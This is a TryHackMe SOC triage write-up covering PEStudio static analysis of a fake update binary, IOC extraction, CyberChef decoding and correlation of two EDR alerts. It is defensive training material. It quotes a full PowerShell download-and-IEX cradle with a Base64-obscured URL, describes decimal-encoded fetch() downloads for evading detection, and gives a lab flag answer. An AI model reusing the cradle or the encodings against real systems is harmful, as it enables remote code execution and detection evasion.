# 🔬 TryHackMe: SOC Triage — Malware Analysis & Alert Correlation Writeup

**Platform:** TryHackMe  
**Difficulty:** Intermediate  
**Tools Used:** PEStudio, CyberChef, EDR (Shadow Trace)  
**MITRE ATT&CK Techniques:** T1105 (Ingress Tool Transfer) · T1059.001 (PowerShell) · T1071.001 (Web Protocol C2) · T1027 (Obfuscated Files) · T1140 (Deobfuscation/Decode)

---

## Scenario

Mid-night SOC shift. A suspicious file named `windows-update.exe` was found on a user's machine and flagged for immediate review. Simultaneously, the EDR fired two critical alerts tied to the same host. Task: perform static analysis on the binary to extract IOCs, decode obfuscated payloads, and correlate the EDR alerts to piece together the full attack chain before it spreads.

---

## Skills Demonstrated

- Static binary analysis using PEStudio (architecture, hash, imports, strings)
- IOC extraction from binary string artifacts
- Decoding obfuscated payloads using CyberChef (Base64, Decimal/CharCode)
- Correlating EDR alert command lines to malicious URLs and behaviors
- Triage workflow: file analysis → IOC collection → alert correlation

---

## Task 1: File Analysis — windows-update.exe

**Tool:** PEStudio  
**File path:** `C:\Users\DFIRUser\Desktop\windows-update.exe`

### Binary Metadata

| Property | Value |
|----------|-------|
| Architecture | **64-bit** |
| SHA-256 Hash | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` |
| Subsystem | Console |
| Compiler | Visual Studio 2008 |

### String Analysis

PEStudio flagged 1,324 strings. Key findings:

**Malicious URL (IOC #1):**
```
http://tryhatme.com/update/security-update.exe
```

**C2 Domain (IOC #2):**
```
responses.tryhatme.com
```

Additional strings confirmed the binary's capabilities — connecting to C2, downloading files, modifying the Windows hosts file, and exfiltrating data.

### Decoding the Suspicious Domain

The domain `responses.tryhatme.com` hosted a Base64-encoded path. Decoded in **CyberChef → From Base64**:

```
Input:  tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
Output: THM{you_g0t_some_IOCs_friend}
```

### Imports Analysis

| Library | Purpose |
|---------|---------|
| **WS2_32.dll** | Windows Sockets API — confirms active network communication |

---

## Task 2: Alert Correlation — Shadow Trace EDR

Two **Critical** alerts on `WIN-SRV-01.tryhackme.local / CORPsvc_backup`.

---

### Alert 1 — Suspicious PowerShell Execution (08:25)

**Command observed:**
```powershell
(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX
```

Decoded with **CyberChef → From Base64**:

```
Input:  aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl
Output: https://tryhatme.com/dev/main.exe
```

**Malicious URL (IOC #3):** `https://tryhatme.com/dev/main.exe`

Technique: T1059.001 + T1027 — fileless in-memory execution via IEX with Base64-encoded URL to evade string detection.

---

### Alert 2 — Suspicious Browser JavaScript Execution (09:25)

**Command observed:** A `fetch()` call using a comma-separated ASCII decimal array to encode the URL — designed to bypass URL-based detection rules entirely.

Decoded with **CyberChef → From Decimal (Comma delimiter)**:

```
Input:  104,116,116,112,115,58,47,47,114,101,97,108,108,121...
Output: https://reallysecureupdate.tryhatme.com/update.exe
```

**Malicious URL (IOC #4):** `https://reallysecureupdate.tryhatme.com/update.exe`  
**File saved as:** `test.txt` (benign filename used to evade download inspection)

Technique: T1105 + T1027 — browser JavaScript downloads executable as a renamed file with URL obfuscated as decimal charcode array.

---

## IOC Summary

| IOC Type | Value | Source |
|----------|-------|--------|
| SHA-256 | `b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc` | PEStudio |
| Malicious URL | `http://tryhatme.com/update/security-update.exe` | PEStudio strings |
| C2 Domain | `responses.tryhatme.com` | PEStudio strings |
| Malicious URL | `https://tryhatme.com/dev/main.exe` | EDR Alert 1 — Base64 decoded |
| Malicious URL | `https://reallysecureupdate.tryhatme.com/update.exe` | EDR Alert 2 — Decimal decoded |
| Network Library | `WS2_32.dll` | PEStudio imports |
| Dropped filename | `test.txt` | EDR Alert 2 |

---

## Attack Chain Reconstruction

```
[Binary Delivered: windows-update.exe]
  → Connects to responses.tryhatme.com (C2)
  → Attempts download from tryhatme.com/update/security-update.exe
  → Modifies hosts file to redirect traffic
  ↓
[PowerShell Alert — 08:25]
  → Base64-encoded IEX downloads https://tryhatme.com/dev/main.exe
  → Fileless execution in memory, no disk artifact
  ↓
[Chrome JavaScript Alert — 09:25]
  → Decimal-encoded URL downloads https://reallysecureupdate.tryhatme.com/update.exe
  → Saved as test.txt to bypass filename-based detection
```

---

## Decoding Techniques Used

| Encoding | CyberChef Recipe | Output |
|----------|-----------------|--------|
| Base64 | From Base64 | `THM{you_g0t_some_IOCs_friend}` |
| Base64 | From Base64 | `https://tryhatme.com/dev/main.exe` |
| Decimal (ASCII charcode) | From Decimal (Comma) | `https://reallysecureupdate.tryhatme.com/update.exe` |

---

## Key Takeaways

- Static analysis with PEStudio surfaces IOCs without executing anything — always start here during triage to stay safe
- Attackers encode URLs inside PowerShell and JavaScript to bypass string-matching rules; CyberChef From Base64 and From Decimal cover the most common patterns
- `WS2_32.dll` in imports confirms network capability — combine with string artifacts to map C2 behavior without running the file
- The same domain family appearing across the binary and both EDR alerts confirms a coordinated campaign — pivoting on the domain is more effective than chasing individual URLs
- Raw EDR command lines require analyst decoding to be actionable; the ability to recognize and decode obfuscation on-the-fly is a core SOC triage skill

---

*Part of an ongoing TryHackMe SOC Analyst learning path | Tools: PEStudio, CyberChef, Shadow Trace EDR | Frameworks: MITRE ATT&CK*
